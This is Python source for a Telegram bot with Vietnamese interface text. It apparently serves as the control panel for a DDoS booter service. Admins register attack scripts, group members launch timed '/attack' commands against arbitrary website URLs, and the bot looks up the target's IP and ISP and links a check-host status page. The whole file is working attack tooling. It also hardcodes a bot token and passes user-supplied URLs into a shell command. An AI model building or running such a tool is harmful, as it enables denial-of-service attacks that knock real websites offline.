import time, json, asyncio, socket, requests
from urllib import parse
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from html import escape
import pytz

TOKEN = '7831523452:AAH_eaJxOeUBstLQbnwhY6bMKqr7xz9IvdU'
ADMIN_ID, GROUP_ID = 7371969470, -1002200204153
user_processes = {}

# Thiết lập múi giờ Việt Nam
VIE_TZ = pytz.timezone('Asia/Ho_Chi_Minh')

def load_methods():
    try:
        return json.load(open('methods.json', 'r'))
    except:
        return {}

def save_methods(data):
    with open('methods.json', 'w') as f:
        json.dump(data, f, indent=4)

def get_ip_and_isp(url):
    try:
        ip = socket.gethostbyname(parse.urlsplit(url).netloc)
        response = requests.get(f"http://ip-api.com/json/{ip}")
        return ip, response.json() if response.ok else None
    except:
        return None, None

async def command_handler(update, context, handler_func, min_args, help_text):
    if len(context.args) < min_args:
        return await update.message.reply_text(help_text)
    return await handler_func(update, context)

async def add_method(update, context, methods_data):
    if update.message.from_user.id != ADMIN_ID:
        return await update.message.reply_text("Bạn không có quyền sử dụng lệnh này.")
    if len(context.args) < 2:
        return await update.message.reply_text("Cú pháp không hợp lệ. Sử dụng lệnh như sau: \n/add <method_name> <url> timeset <time> <additional_args>")
    method_name, url = context.args[0], context.args[1]
    attack_time = 60  # Thời gian mặc định nếu không có tham số timeset
    if 'timeset' in context.args:
        try:
            attack_time = int(context.args[context.args.index('timeset') + 1])
        except:
            return await update.message.reply_text("Tham số thời gian không hợp lệ.")
        context.args = context.args[:context.args.index('timeset')] + context.args[context.args.index('timeset') + 2:]
    command = f"node --max-old-space-size=102400 {method_name} {url} {attack_time} " + " ".join(context.args[2:])
    methods_data[method_name] = {'command': command, 'url': url, 'time': attack_time}
    save_methods(methods_data)
    await update.message.reply_text(f"Phương thức {method_name} đã được thêm vào.")

async def attack_method(update, context, methods_data):
    if update.message.chat.id != GROUP_ID:
        return await update.message.reply_text("Nhóm không hợp lệ. Lệnh này chỉ được phép sử dụng trong nhóm đã chỉ định.")
    if update.message.from_user.id in user_processes and user_processes[update.message.from_user.id].returncode is None:
        return await update.message.reply_text("Bạn đang có một cuộc tấn công đang diễn ra. Vui lòng đợi cho đến khi kết thúc trước khi bắt đầu cuộc tấn công mới.")
    if len(context.args) < 2:
        return await update.message.reply_text("Cú pháp không hợp lệ. Sử dụng lệnh như sau: \n/attack <method_name> <url> [time]")
    method_name, url = context.args[0], context.args[1]
    if method_name not in methods_data:
        return await update.message.reply_text("Phương thức không tồn tại.")
    attack_time = methods_data[method_name].get('time', None)
    if update.message.from_user.id == ADMIN_ID and len(context.args) > 2:
        try:
            attack_time = int(context.args[2])
        except ValueError:
            return await update.message.reply_text("Tham số thời gian không hợp lệ. Vui lòng nhập một số hợp lệ.")
    if update.message.from_user.id != ADMIN_ID and len(context.args) > 2:
        return await update.message.reply_text("Bạn không phải là admin. Bạn không thể chỉ định thời gian cho cuộc tấn công.")
    if not attack_time:
        return await update.message.reply_text(f"Thời gian tấn công của phương thức {method_name} không được thiết lập trong methods.json.")
    ip, isp_info = get_ip_and_isp(url)
    if not ip:
        return await update.message.reply_text("Không thể lấy IP từ URL.")
    command = methods_data[method_name]['command'].replace(methods_data[method_name]['url'], url).replace(str(methods_data[method_name]['time']), str(attack_time))
    isp_info_text = json.dumps(isp_info, indent=2, ensure_ascii=False) if isp_info else 'Không có thông tin ISP.'
    username = update.message.from_user.username or update.message.from_user.full_name
    start_time = time.time()  # Thời gian bắt đầu cuộc tấn công
    check_status_button = InlineKeyboardButton("🔍 Kiểm tra trạng thái website", url=f"https://check-host.net/check-http?host={url}")
    keyboard = InlineKeyboardMarkup([[check_status_button]])
    # Đổi múi giờ thành giờ Việt Nam
    start_time_vn = datetime.fromtimestamp(start_time, VIE_TZ).strftime('%Y-%m-%d %H:%M:%S')
    
    await update.message.reply_text(
        f"Cuộc tấn công {method_name} đã được bắt đầu bởi @{username}.\nThông tin ISP của máy chủ {escape(url)}:\n<pre>{escape(isp_info_text)}</pre>\n"
        f"Cuộc tấn công sẽ kéo dài {attack_time} giây.\n"
        f"Cuộc tấn công bắt đầu lúc: {start_time_vn}",
        parse_mode='HTML', reply_markup=keyboard
    )
    asyncio.create_task(execute_attack(command, update, method_name, keyboard, url, start_time, attack_time))

async def execute_attack(command, update, method_name, keyboard, url, start_time, attack_time):
    try:
        process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        user_processes[update.message.from_user.id] = process
        stdout, stderr = await process.communicate()
        end_time = time.time()
        attack_status = "thành công" if not stderr else "thất bại"
        error_message = stderr.decode() if stderr else None
    except Exception as e:
        end_time = time.time()
        attack_status = "thất bại"
        error_message = str(e)
    elapsed_time = round(end_time - start_time, 2)
    attack_info = {
        "method_name": method_name,
        "username": update.message.from_user.username or update.message.from_user.full_name,
        "start_time": datetime.fromtimestamp(start_time, VIE_TZ).strftime('%Y-%m-%d %H:%M:%S'),
        "end_time": datetime.fromtimestamp(end_time, VIE_TZ).strftime('%Y-%m-%d %H:%M:%S'),
        "elapsed_time": elapsed_time,
        "attack_status": attack_status,
        "error": error_message or "Không có"
    }
    attack_info_text = json.dumps(attack_info, indent=2, ensure_ascii=False)
    safe_attack_info_text = escape(attack_info_text)
    await update.message.reply_text(
        f"Cuộc tấn công đã hoàn thành! Tổng thời gian: {elapsed_time} giây.\n\nChi tiết:\n<pre>{safe_attack_info_text}</pre>",
        parse_mode='HTML', reply_markup=keyboard
    )
    del user_processes[update.message.from_user.id]

async def list_methods(update, methods_data):
    if not methods_data:
        return await update.message.reply_text("Không có phương thức nào.")
    methods_list = "Các phương thức có sẵn:\n" + "\n".join([f"{name}: {data['time']} giây" for name, data in methods_data.items()])
    await update.message.reply_text(methods_list)

async def delete_method(update, context, methods_data):
    if update.message.from_user.id != ADMIN_ID:
        return await update.message.reply_text("Bạn không có quyền sử dụng lệnh này.")
    if len(context.args) < 1:
        return await update.message.reply_text("Cú pháp không hợp lệ. Sử dụng lệnh như sau: \n/del <method_name>")
    method_name = context.args[0]
    if method_name in methods_data:
        del methods_data[method_name]
        save_methods(methods_data)
        await update.message.reply_text(f"Phương thức {method_name} đã được xóa.")
    else:
        await update.message.reply_text(f"Phương thức {method_name} không tồn tại.")

async def help_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
    **/add <method_name> <url> timeset <time>**: Thêm một phương thức tấn công mới (Chỉ Admin).
    **/attack <method_name> <url> [time]**: Khởi động một cuộc tấn công sử dụng phương thức đã thêm (Chỉ Admin).
    **/methods**: Xem các phương thức có sẵn.
    **/del <method_name>**: Xóa một phương thức (Chỉ Admin).
    **/help**: Hiển thị hướng dẫn sử dụng các lệnh.
    """
    await update.message.reply_text(help_text)

def main():
    methods_data = load_methods()
    application = ApplicationBuilder().token(TOKEN).build()
    application.add_handler(CommandHandler("add", lambda update, context: command_handler(update, context, lambda u, c: add_method(u, c, methods_data), 2, "Cú pháp không hợp lệ. Sử dụng lệnh như sau: \n/add <method_name> <url> timeset <time> <additional_args>")))
    application.add_handler(CommandHandler("attack", lambda update, context: command_handler(update, context, lambda u, c: attack_method(u, c, methods_data), 2, "Cú pháp không hợp lệ. Sử dụng lệnh như sau: \n/attack <method_name> <url> [time]")))
    application.add_handler(CommandHandler("methods", lambda update, context: list_methods(update, methods_data)))
    application.add_handler(CommandHandler("del", lambda update, context: delete_method(update, context, methods_data)))
    application.add_handler(CommandHandler("help", help_message))
    application.run_polling()

if __name__ == "__main__": main()
